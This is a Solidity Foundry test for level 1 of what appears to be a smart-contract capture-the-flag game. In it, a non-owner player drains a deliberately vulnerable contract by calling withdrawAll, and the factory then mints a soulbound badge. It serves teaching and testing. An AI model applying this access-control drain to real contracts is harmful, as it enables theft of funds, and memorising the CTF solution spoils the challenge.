// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {Level1_AccessControl} from "../src/Level1_AccessControl.sol";

contract Level1AccessControlTest is Test {
    CTFFactory public factory;
    address public player = address(0x1234);

    function setUp() public {
        factory = new CTFFactory();
        vm.deal(player, 1 ether);
    }

    function test_AccessControlExploitAndValidation() public {
        vm.startPrank(player);

        // 1. Deploy Level 1 instance ( funded with 0.02 ETH )
        address instanceAddr = factory.deployLevel1{value: 0.02 ether}();
        assertEq(instanceAddr.balance, 0.02 ether, "Instance not funded");
        assertEq(factory.levelInstances(1, player), instanceAddr, "Instance not mapped to player");

        // 2. Exploit: Player calls withdrawAll on the vulnerable contract
        Level1_AccessControl target = Level1_AccessControl(instanceAddr);
        assertFalse(target.owner() == player, "Player should not be owner");
        
        target.withdrawAll(payable(player));

        // 3. Verify target contract has been drained to 0
        assertEq(instanceAddr.balance, 0, "Target contract not drained");

        // 4. Validate hack on the Factory to claim Soulbound Badge
        factory.validateLevel1();

        // 5. Assert that the player now owns Soulbound Badge #1
        uint256 badgeBalance = factory.badgeContract().balanceOf(player, 1);
        assertEq(badgeBalance, 1, "Soulbound Badge not minted");

        vm.stopPrank();
    }
}
